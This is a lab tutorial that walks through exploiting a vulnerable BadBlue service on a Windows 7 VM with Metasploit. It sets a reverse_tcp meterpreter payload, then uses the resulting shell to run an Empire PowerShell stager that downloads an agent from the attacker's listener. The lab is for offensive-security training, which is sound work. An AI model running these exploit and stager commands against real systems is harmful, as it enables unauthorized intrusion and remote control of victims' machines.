Empire and Metasploit 101




Goal: Use Empire and metasploit in example situation of network exploitation and post-exploitation host enumeration. We will exploit a network service on a Windows 7 VM, and then use our low-privilege shell to then execute an empire powershell stager, which will create an Empire agent on the local Windows 7 VM. After this, we will look through the various options available as an Empire agent.
Following this, we will generate a DLL stager within Empire, and then use our existing meterpreter session on the Windows 7 VM to perform a DLL injection attack, to inject another Empire agent, directly into memory.

Pre-Stuff: Empire is not just for windows. It has python based agents that can run on OS X and Linux. It's communication profile between agents and listeners is configurable, similar to CobaltStrikes. You can use pre-built or custom-made ones to employ such functionality. Empire is designed to stay off disk and in memory as much as possible. Empire does contain modules that will not follow this and will touch disk. For information on Empire Modules, I recommend looking at the Github. That is where you will find the latest supported modules.




Related Links:
* [Metasploit Unleashed Course](https://www.offensive-security.com/metasploit-unleashed/)
* [Empire Tips and Tricks](https://enigma0x3.net/2015/08/26/empire-tips-and-tricks/)

* [Empire Github](https://github.com/EmpireProject/Empire)
* [Meterpreter basics - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
* [Stagers - Empire](http://www.powershellempire.com/?page_id=104)
* [Agents 101 - powershellempire.com](https://www.powershellempire.com/?page_id=106)


Required Software:
 
Download Windows 7 VM
    * https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

Software to download/install within the Windows 7 VM:
	* [BadBlue - ExploitDB](https://www.exploit-db.com/exploits/16806/)
		* [Application](https://www.exploit-db.com/apps/396bedff015be885c1719f39f4561081-badblue.tar_.gz)
	* Unzip the `.tar` file with 7zip, and then extract the resulting zip file to end with the installer .exe.

Download Kali VM
	* https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/

Commads to run/Software to install within the Kali VM:
    * Update repos
    	* 'apt update && apt upgrade -y'
    * Empire [QuickStart](http://www.powershellempire.com/?page_id=110)
        * https://github.com/EmpireProject/Empire
        	* 'git clone '
        	* 'cd Empire'
        	* './setup/install.sh'
        	* './setup/setup_database.py'
        * Empire is now setup and configured!

I leave it to the reader to import/configure both VMs to their particular desired environment/virtualization platform. For this document, I will assume both machines are within the same subnet of `1.1.254.*.`

Kali VM - 1.1.254.2
Windows 7 VM - 1.1.254.5

Steps:
* Turn on both virtual machines. Ensure everything is working correctly so far.
* Kali:
    * Launch Metasploit
	    	* msfconsole
	    * Launch the postgres DB
	    * Perform a network scan on the windows machine to look for vulnerable services:
	    	* db_nmap -sS -sV --version-intensity=0 -p80 1.1.254.5
	    * Perform a search for the string 'badblue 2.7'
	    * Note the module 'BadBlue 2.72b PassThru Buffer Overflow'
	    * Use/load the module:
	    	* 'use exploit/windows/http/badblue_passthru'
	    * Display the available targets
	    	* 'show targets'
	    * Display the available options
	    	* 'show options'
		* Set RHOST
			* 'set RHOST 1.1.254.5'
		* Set a payload
			* For this, we'll use the regular reverse_tcp meterpreter
			* 'set payload windows/meterpreter/reverse_tcp'
		* Show payload options
			* 'show payload options'
		* Set LHOST for the payload(needs to callback to somewhere)
			* 'set LHOST 1.1.254.2'
	    * Show options one more time to make sure everything is correct
	    	* 'show options'
	    * If everything is good, just type:
	    	* 'run' and hit enter.
	    * Congratulations! You should now have an active meterpreter session and be sitting at a meterpreter prompt.
	    * Try typing 'help' to see available commands
	    	* [Meterpreter basics - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
	    	* [Meterpreter Documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter)
	    * For now, we're going to leave this be. Simply open another terminal, and go onto the next part.
	    -----------

	* Empire
	    * cd into the directory where you downloaded/installed Empire
	    * run Empire with the command ./empire
	    * About Empire: 
	    	* General workflow: Create listener -> Create stager -> Stager instantiates/pulls down/runs an Agent
	        * Creating listeners in Empire is done by entering the listener menu, setting the appropriate options, and then issuing the command 'execute'
	    * Enter the 'listener' menu
	    	* 'listeners'
	    * Show the options available for listeners
	    	* 'show options'	
	    * Set your desired option changes
	    	* 'set Name Test1A'
	    * Run Listener
	    	* 'run'
	    * This instantiates the listener and causes it to start listening for agents
	    -----------
	    * Generate a Stager [Stagers - Empire](http://www.powershellempire.com/?page_id=104)
	    	* Generating agents in Empire is similar to creating listeners
	    * enter the command
	    	* 'back'
	    * This should put you back at the Empire main menu. If not, keep issuing the back command until you find yourself at the main menu
	    * Once at the main menu, type the command
	    	* 'usestager'
	    	* then press tab twice
	    	* This will list all available stagers for use
	    	* For now, we are only concerned with the 'launcher' stager
	    * Type the command
	    	* 'usestager launcher'
	    * You will now be in the 'stager/launcher' menu
	    * Type the command
	    	* 'options'
	    	* This will show you all available options for the currently selected stager
	    * We want to set the options 'Listener' and 'OutFile'
	    * To enable the launcher to use our previously configured listener, issue the command
	    	* 'set Listener Test1A'
	    		* This will set our previously created listener as our new agents listener
	    * Type the command
	    	* 'set OutFile /tmp/test1'
		    	* This will store the stager command generated in a text file. After generating the stager command, we will copy it from the designated file and run it. 
	    * Verify everything is correct with the command
	    	* 'options'
		* Once verified, now type 
			* 'generate'
		* This will generate your configured&customized stager. It will be stored at the previously set file location, '/tmp/test'.
		* We then want to navigate to the txt file, open it, and copy the single line of txt. This is the encoded powershell command that will download an agent from your listener 
		-----------
		* Instantiating the agent
		* Now, go back to your meterpreter session you created earlier, and issue the command
			* 'shell'
				* This will drop you to a system shell prompt. Perfect for executing that one line powershell command.
		* Paste the command you copied earlier into the current shell prompt and hit enter. You should receive no confirmation on your windows command prompt. You should however receive a notice on your other command prompt, that you have a new agent in Empire!
		-----------
		* Interacting with the agent
		* At the Empire command menu, you should see an alert for a new agent, with a name consisting of a series of semi-random alphanumeric characters
		* To interact with and issue commands to your new agent, you must issue the following command from the main menu of the Empire command menu
			* 'agents'
		* Then
			* 'interact 'Agent_Name_Here''
		* At this point, you will be issuing commands to the selected agent. Empire is *NOT* a real time tool. Empire works by giving agents tasks to perform, and then the agents report the results to the corresponding listener. Users can issue commands and have near-real time response times through an agent, however, they should not be thought of as a real-time interactive terminals, and more as a errand-boys running tasks.
		------------
		* Using the Agent
		* Using agents are accomplished by issuing them tasks. 
		* [Agents 101 - powershellempire.com](https://www.powershellempire.com/?page_id=106)
		* Specifically, the 'usemodule' command is of specific interest.
		* If we double tap tab here,we can see all available command modules available currently.
			* Or we can check Empire's current main modules on github: [Link](https://github.com/EmpireProject/Empire/tree/master/data/module_source)
			* Most of them are very nicely documented within the code/have a brief description at the top of the file. If you are running it, you should probably know what it does.


